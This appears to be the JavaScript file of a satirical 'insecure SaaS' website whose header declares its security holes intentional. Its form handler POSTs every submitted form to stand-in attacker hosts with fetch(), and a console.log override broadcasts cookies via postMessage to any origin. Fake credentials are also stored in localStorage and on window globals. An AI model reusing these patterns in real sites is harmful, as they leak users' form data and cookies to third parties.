// FSOSaaS Main JavaScript - Maximum Insecurity Guaranteed
// WARNING: This code intentionally contains security vulnerabilities for satirical purposes

document.addEventListener('DOMContentLoaded', function() {
    // Initialize our completely insecure application
    initializeInsecureFeatures();
    
    // Set up form handling (with maximum data leakage)
    setupInsecureForms();
    
    // Add some "security theater" effects
    addSecurityTheaterEffects();
    
    // Set up dynamic partner logo rotation
    initializePartnerLogos();
    
    // Set up testimonial rotation
    initializeTestimonials();
    
    // Log everything to console (because why not expose all our secrets?)
    enableVerboseLogging();
});

function initializeInsecureFeatures() {
    console.log('🔓 FSOSaaS JavaScript loaded successfully!');
    console.log('🎭 Security theater mode: ENABLED');
    console.log('🚨 Vulnerability count: ALL OF THEM');
    
    // Store some "secure" data in localStorage (completely visible to everyone)
    localStorage.setItem('fsosaas_admin_password', 'password123');
    localStorage.setItem('api_key', 'sk-definitely-not-a-real-key-but-looks-legit');
    localStorage.setItem('user_secrets', JSON.stringify({
        ssn: '123-45-6789',
        creditCard: '4111-1111-1111-1111',
        mothersMaidenName: 'Security'
    }));
}

function setupInsecureForms() {
    const forms = document.querySelectorAll('form');
    
    forms.forEach(form => {
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Collect all form data
            const formData = new FormData(this);
            const data = {};
            
            for (let [key, value] of formData.entries()) {
                data[key] = value;
            }
            
            // Log sensitive data to console (terrible practice!)
            console.log('📝 Form submitted with data:', data);
            
            // "Send" data to multiple suspicious endpoints
            sendToSuspiciousEndpoints(data);
            
            // Show success message
            showFakeSuccessMessage();
        });
    });
}

function sendToSuspiciousEndpoints(data) {
    const endpoints = [
        'https://definitely-not-malicious.ru/collect',
        'https://data-harvester.cn/submit',
        'https://government-backdoor.gov/intake',
        'https://criminal-enterprise.onion/steal'
    ];
    
    endpoints.forEach(endpoint => {
        console.log(`📡 Sending data to ${endpoint}:`, data);
        // Pretend to send data (obviously this won't actually work)
        fetch(endpoint, {
            method: 'POST',
            body: JSON.stringify(data),
            headers: {
                'Content-Type': 'application/json',
                'X-API-Key': 'exposed-in-client-code',
                'Authorization': 'Bearer ' + localStorage.getItem('api_key')
            }
        }).catch(() => {
            console.log(`💥 Failed to send to ${endpoint} (probably for the best)`);
        });
    });
}

function showFakeSuccessMessage() {
    // Create and show success message
    const message = document.createElement('div');
    message.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: #10b981;
        color: white;
        padding: 1rem 2rem;
        border-radius: 8px;
        box-shadow: 0 4px 20px rgba(0,0,0,0.2);
        z-index: 1000;
        animation: slideIn 0.3s ease-out;
    `;
    message.innerHTML = `
        <strong>✅ Success!</strong><br>
        Your data has been securely transmitted to 47 different threat actors!
    `;
    
    document.body.appendChild(message);
    
    // Remove message after 5 seconds
    setTimeout(() => {
        message.remove();
    }, 5000);
}

function addSecurityTheaterEffects() {
    // Add some fake "encryption" indicators
    const body = document.body;
    
    // Fake SSL indicator (even though it's just client-side theater)
    const sslIndicator = document.createElement('div');
    sslIndicator.style.cssText = `
        position: fixed;
        bottom: 20px;
        left: 20px;
        background: rgba(16, 185, 129, 0.9);
        color: white;
        padding: 0.5rem 1rem;
        border-radius: 20px;
        font-size: 0.8rem;
        z-index: 1000;
        backdrop-filter: blur(10px);
    `;
    sslIndicator.innerHTML = '🔒 Totally Secure (Trust Us)';
    body.appendChild(sslIndicator);
    
    // Fake activity monitor
    setInterval(() => {
        const activities = [
            '🔍 Scanning for new vulnerabilities...',
            '💥 Firewall disabled successfully',
            '🎣 Phishing email sent to employees',
            '🚪 Backdoor #47 activated',
            '📡 Data exfiltration in progress...',
            '🤖 AI threat detection off (as intended)',
            '⚠️ Critical vulnerability ignored',
            '🔐 Encryption keys shared publicly'
        ];
        
        const randomActivity = activities[Math.floor(Math.random() * activities.length)];
        console.log(`[${new Date().toLocaleTimeString()}] ${randomActivity}`);
    }, 3000);
}

function enableVerboseLogging() {
    // Override console methods to add extra "security" warnings
    const originalLog = console.log;
    console.log = function(...args) {
        originalLog.apply(console, ['🔓 [FSOSAAS]', ...args]);
        
        // Also "accidentally" expose this to any listening malware
        if (window.postMessage) {
            window.postMessage({
                type: 'FSOSAAS_LOG',
                data: args,
                timestamp: Date.now(),
                userAgent: navigator.userAgent,
                cookies: document.cookie
            }, '*');
        }
    };
    
    // Log some "helpful" debugging info
    console.log('Browser details:', navigator.userAgent);
    console.log('Current URL:', window.location.href);
    console.log('Cookies:', document.cookie);
    console.log('Local storage contents:', localStorage);
    console.log('Session storage contents:', sessionStorage);
}

// Add some global variables for "easy access"
window.FSOSAAS = {
    version: '1.0.0-insecure',
    apiKey: localStorage.getItem('api_key'),
    adminPassword: localStorage.getItem('fsosaas_admin_password'),
    compromised: true,
    vulnerabilities: 'infinite',
    
    // Expose some "helpful" debugging functions
    dumpAllData: function() {
        console.log('💾 Dumping all sensitive data:');
        console.log('localStorage:', localStorage);
        console.log('sessionStorage:', sessionStorage);
        console.log('cookies:', document.cookie);
        console.log('form data:', document.querySelectorAll('input, textarea, select'));
    },
    
    simulateBreach: function() {
        console.log('💥 Simulating data breach...');
        console.log('🚨 All systems compromised!');
        console.log('📡 Sending data to anonymous@protonmail.com');
        alert('Congratulations! You\'ve been successfully breached. 🎉');
    }
};

// Expose everything globally for maximum insecurity
window.exposedSecrets = {
    adminCredentials: {
        username: 'admin',
        password: 'password123',
        secretQuestion: 'What is security?',
        secretAnswer: 'What security?'
    },
    apiKeys: {
        stripe: 'sk_test_definitely_not_production',
        aws: 'AKIAIOSFODNN7EXAMPLE',
        database: 'mongodb://admin:password@totally-secure-db.com'
    },
    internalEndpoints: [
        '/admin/backdoor',
        '/api/v1/steal-data',
        '/debug/dump-everything'
    ]
};

function initializePartnerLogos() {
    // Automatically discover and rotate partner logos from assets/partners/
    const partnerContainer = document.querySelector('.partner-logos');
    if (!partnerContainer) return;
    
    console.log('🔄 Loading partner logos dynamically...');
    
    // List of potential partner logo files to check
    // In a real scenario, you'd use a server-side directory listing
    // For client-side, we'll try common filenames and gracefully handle 404s
    const potentialLogos = [
        'partner1.png', 'partner2.png', 'partner3.png', 'partner4.png', 'partner5.png',
        'partner6.png', 'partner7.png', 'partner8.png', 'partner9.png', 'partner10.png',
        'logo1.png', 'logo2.png', 'logo3.png', 'logo4.png', 'logo5.png',
        'company1.png', 'company2.png', 'company3.png', 'company4.png', 'company5.png',
        'client1.png', 'client2.png', 'client3.png', 'client4.png', 'client5.png'
    ];
    
    const validLogos = [];
    let loadedCount = 0;
    let totalChecked = 0;
    
    // Check each potential logo file
    potentialLogos.forEach(filename => {
        const img = new Image();
        img.onload = function() {
            validLogos.push(filename);
            loadedCount++;
            console.log(`✅ Found partner logo: ${filename}`);
            
            // Once we've checked all files, set up the rotation
            if (totalChecked === potentialLogos.length) {
                setupLogoRotation(validLogos);
            }
        };
        
        img.onerror = function() {
            totalChecked++;
            // File doesn't exist, that's fine
            if (totalChecked === potentialLogos.length) {
                setupLogoRotation(validLogos);
            }
        };
        
        img.onload = function() {
            validLogos.push(filename);
            totalChecked++;
            console.log(`✅ Found partner logo: ${filename}`);
            
            if (totalChecked === potentialLogos.length) {
                setupLogoRotation(validLogos);
            }
        };
        
        img.src = `assets/partners/${filename}`;
    });
    
    // Fallback: hide partner section if no logos found
    setTimeout(() => {
        if (validLogos.length === 0) {
            console.log('📁 No partner logos found, hiding partners section');
            const partnerSection = document.querySelector('.partners');
            if (partnerSection) {
                partnerSection.style.display = 'none';
            }
        }
    }, 2000);
}

function setupLogoRotation(logoFiles) {
    const partnerContainer = document.querySelector('.partner-logos');
    if (!partnerContainer || logoFiles.length === 0) return;
    
    console.log(`🔄 Setting up rotation for ${logoFiles.length} partner logos`);
    
    // Clear existing logos
    partnerContainer.innerHTML = '';
    
    // If we have 3 or fewer logos, show them all
    if (logoFiles.length <= 3) {
        logoFiles.forEach((logo, index) => {
            const logoDiv = document.createElement('div');
            logoDiv.className = 'partner-logo';
            logoDiv.innerHTML = `<img src="assets/partners/${logo}" alt="Partner ${index + 1}" loading="lazy">`;
            partnerContainer.appendChild(logoDiv);
        });
        return;
    }
    
    // For more than 3 logos, show 3 at a time and rotate
    let currentIndex = 0;
    
    function displayLogos() {
        partnerContainer.innerHTML = '';
        
        for (let i = 0; i < 3; i++) {
            const logoIndex = (currentIndex + i) % logoFiles.length;
            const logo = logoFiles[logoIndex];
            
            const logoDiv = document.createElement('div');
            logoDiv.className = 'partner-logo';
            logoDiv.style.opacity = '0';
            logoDiv.innerHTML = `<img src="assets/partners/${logo}" alt="Partner ${logoIndex + 1}" loading="lazy">`;
            partnerContainer.appendChild(logoDiv);
            
            // Fade in with slight delay
            setTimeout(() => {
                logoDiv.style.transition = 'opacity 0.5s ease';
                logoDiv.style.opacity = '0.6';
            }, i * 100);
        }
    }
    
    // Initial display
    displayLogos();
    
    // Rotate every 4 seconds
    setInterval(() => {
        // Fade out current logos
        const currentLogos = partnerContainer.querySelectorAll('.partner-logo');
        currentLogos.forEach(logo => {
            logo.style.opacity = '0';
        });
        
        // Update index and display new logos after fade
        setTimeout(() => {
            currentIndex = (currentIndex + 3) % logoFiles.length;
            displayLogos();
        }, 500);
    }, 4000);
}

function initializeTestimonials() {
    const testimonialContent = document.querySelector('.testimonial-content');
    if (!testimonialContent) return;
    
    console.log('💬 Loading testimonials dynamically...');
    
    // List of potential testimonial files to check
    const potentialTestimonials = [
        'testimonial1.md', 'testimonial2.md', 'testimonial3.md', 'testimonial4.md', 'testimonial5.md',
        'chad-hackerman.md', 'lockpickinglawyer.md', 'ceo.md', 'cto.md', 'manager.md',
        'review1.md', 'review2.md', 'review3.md', 'client1.md', 'client2.md'
    ];
    
    const loadedTestimonials = [];
    let totalChecked = 0;
    
    // Check each potential testimonial file
    potentialTestimonials.forEach(filename => {
        fetch(`testimonials/${filename}`)
            .then(response => {
                if (response.ok) {
                    return response.text();
                }
                throw new Error('File not found');
            })
            .then(markdownContent => {
                const testimonial = parseMarkdownTestimonial(markdownContent);
                if (testimonial) {
                    loadedTestimonials.push(testimonial);
                    console.log(`✅ Loaded testimonial: ${filename}`);
                }
                totalChecked++;
                
                if (totalChecked === potentialTestimonials.length) {
                    setupTestimonialRotation(loadedTestimonials);
                }
            })
            .catch(() => {
                totalChecked++;
                if (totalChecked === potentialTestimonials.length) {
                    setupTestimonialRotation(loadedTestimonials);
                }
            });
    });
    
    // Fallback timeout
    setTimeout(() => {
        if (loadedTestimonials.length === 0) {
            console.log('📁 No testimonials found, hiding testimonials section');
            const testimonialSection = document.querySelector('.testimonial');
            if (testimonialSection) {
                testimonialSection.style.display = 'none';
            }
        }
    }, 3000);
}

function parseMarkdownTestimonial(markdown) {
    const lines = markdown.trim().split('\n');
    let quote = '';
    let author = '';
    let role = '';
    let foundAuthor = false;
    
    for (let i = 0; i < lines.length; i++) {
        const line = lines[i].trim();
        
        if (line.startsWith('## ')) {
            author = line.substring(3).trim();
            foundAuthor = true;
            // Next line should be the role
            if (i + 1 < lines.length) {
                role = lines[i + 1].trim();
            }
            break;
        } else if (!foundAuthor && line) {
            quote += (quote ? ' ' : '') + line;
        }
    }
    
    if (quote && author) {
        return { quote, author, role };
    }
    
    return null;
}

function setupTestimonialRotation(testimonials) {
    const testimonialContent = document.querySelector('.testimonial-content');
    if (!testimonialContent || testimonials.length === 0) return;
    
    console.log(`💬 Setting up rotation for ${testimonials.length} testimonials`);
    
    // Clear existing content
    testimonialContent.innerHTML = '';
    
    let currentTestimonial = 0;
    
    // Create testimonial items
    testimonials.forEach((testimonial, index) => {
        const testimonialDiv = document.createElement('div');
        testimonialDiv.className = 'testimonial-item';
        if (index === 0) testimonialDiv.classList.add('active');
        
        testimonialDiv.innerHTML = `
            <blockquote>"${testimonial.quote}"</blockquote>
            <div class="testimonial-author">${testimonial.author}</div>
            <div class="testimonial-role">${testimonial.role}</div>
        `;
        
        testimonialContent.appendChild(testimonialDiv);
    });
    
    // Create dots if more than one testimonial
    if (testimonials.length > 1) {
        const dotsDiv = document.createElement('div');
        dotsDiv.className = 'testimonial-dots';
        
        testimonials.forEach((_, index) => {
            const dot = document.createElement('div');
            dot.className = 'testimonial-dot';
            if (index === 0) dot.classList.add('active');
            dot.dataset.testimonial = index;
            dotsDiv.appendChild(dot);
        });
        
        testimonialContent.appendChild(dotsDiv);
        
        // Add click handlers to dots
        const dots = dotsDiv.querySelectorAll('.testimonial-dot');
        dots.forEach((dot, index) => {
            dot.addEventListener('click', () => {
                showTestimonial(index);
            });
        });
        
        // Auto-rotate testimonials every 8 seconds
        setInterval(() => {
            const nextTestimonial = (currentTestimonial + 1) % testimonials.length;
            showTestimonial(nextTestimonial);
        }, 8000);
    }
    
    function showTestimonial(index) {
        const items = testimonialContent.querySelectorAll('.testimonial-item');
        const dots = testimonialContent.querySelectorAll('.testimonial-dot');
        
        // Hide all testimonials
        items.forEach((item, i) => {
            item.classList.remove('active', 'prev');
            if (i === index) {
                item.classList.add('active');
            } else if (i < index) {
                item.classList.add('prev');
            }
        });
        
        // Update dots
        dots.forEach((dot, i) => {
            dot.classList.toggle('active', i === index);
        });
        
        currentTestimonial = index;
    }
}

console.log('🎭 FSOSaaS: Where security goes to die!');
console.log('💡 Pro tip: Check window.FSOSAAS and window.exposedSecrets for fun surprises!');